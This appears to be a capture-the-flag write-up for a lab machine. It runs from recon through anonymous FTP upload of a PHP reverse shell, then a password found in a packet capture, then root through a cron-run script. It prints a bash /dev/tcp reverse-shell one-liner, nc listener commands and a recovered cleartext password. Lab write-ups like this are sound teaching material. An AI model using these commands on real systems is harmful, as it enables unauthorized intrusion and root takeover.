# recon
```console
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.14.151
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
```
## ftp
let start by log into FTP server using Anonymous cred and pulling everything we can.
```console
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 .
drwxr-xr-x    3 65534    65534        4096 Nov 12 04:53 ..
-rw-r--r--    1 0        0               5 Nov 12 04:53 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
```
moreover, I try to `PUT` a file on ftp but I don't have permission to do that on the ftp root directory. you will be able to upload any files if you move to a directory call "ftp"
```console
ftp> cd ftp
250 Directory successfully changed.
ftp> put kurowashere.txt
local: kurowashere.txt remote: kurowashere.txt
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118             0 Dec 16 13:02 kurowashere.txt
226 Directory send OK.
ftp> 
```
after reading `notice.txt` I feel like there is something hidden behind .jpg
```
$ cat notice.txt           
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
so I ran `exiftool` and `binwalk`. I cant find any thing useful from `exiftool` but...
```
$ binwalk important.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 735 x 458, 8-bit/color RGBA, non-interlaced
57            0x39            Zlib compressed data, compressed
```
but maybe it just a rabbit hole, let check web (port 80).
## http
not much to do on the login pag... let's run *gobuster* `$ gobuster dir -u http://$IP -k -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 54`.
```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/files (Status: 301)
/server-status (Status: 403)
```
visit `/files` and you will see that this is the FTP server. which mean that we should be able to see `kurowashere.txt` that we uploaded before. now visit `/files/ftp/` to make sure that it works, BINGO!!! The goal is upload php reverse shell to the server using ftp anonymous cred and then visit web sit to execute it.

# foot hold
let upload our reverse shell, I called it cutiecat.php
```console
ftp> put cutiecat.php
local: cutiecat.php remote: cutiecat.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.00 secs (84.4925 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5493 Dec 16 13:13 cutiecat.php
-rwxrwxr-x    1 112      118             0 Dec 16 13:02 kurowashere.txt
226 Directory send OK.
ftp> 
```
now use netcat to listen to incoming reverse shell, visit `/files/ftp/cutiecat.php`
```console
$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.161.149] 52888
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:13:08 up 59 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
flag 1:
```
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was ______.
```
run tty shell
```console
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

# user

interesting file
```console
www-data@startup:/$ ls
bin   home	      lib	  mnt	      root  srv  vagrant
boot  incidents       lib64	  opt	      run   sys  var
dev   initrd.img      lost+found  proc	      sbin  tmp  vmlinuz
etc   initrd.img.old  media	  recipe.txt  snap  usr  vmlinuz.old
www-data@startup:/$ cd incidents/
www-data@startup:/incidents$ ls
suspicious.pcapng
www-data@startup:/incidents$ python3 -m http.server --cgi 8888
Serving HTTP on 0.0.0.0 port 8888 ...
```
`wget` the .pcapng to your kali and use *Wireshark* to examine it. Follow `tcp.stream eq 7` and you will find lennie passwrod `c4ntg3t3n0ughsp1c3`. Now ssh to startup using Lennie cred -> grab the flag


let's enum
```console
ennie@startup:~/Documents$ ls
concern.txt  list.txt  note.txt
lennie@startup:~/Documents$ cat note.txt 
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
lennie@startup:~/Documents$ cat list.txt 
Shoppinglist: Cyberpunk 2077 | Milk | Dog food
lennie@startup:~/Documents$ cat concern.txt 
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
```
nothing interesting
```console
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12 04:54 .
drwx------ 5 lennie lennie 4096 Dec 16 13:45 ..
-rwxr-xr-x 1 root   root     77 Nov 12 04:53 planner.sh
-rw-r--r-- 1 root   root      1 Dec 16 13:48 startup_list.txt
lennie@startup:~/scripts$ cat planner.sh 
lennie@startup:~/scripts$ cat startup_list.txt 

#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
this is much more juicy!!!



# root
note that 
1. both `planner.sh` and `startup_list.txt`.
2. we have a permission to read both files but **not write**
3. we can execute `planner.sh`
4. $LIST will be write into `startup_list.txt` after we execute `planner.sh`
5. there is a cronjob running that execute `planner.sh` (find out by using `pspy` or `linpeas.sh`)
6. we can edit `/etc/print.sh`

so the plan is `echo "bash -i >& /dev/tcp/10.8.14.151/9696 0>&1" >> /etc/print.sh` and wait for root cronjob to execute `planner.sh` -> `/etc/print.sh` and BOOM ! reverse shell as root

nc and wait for incoming reverse shell. 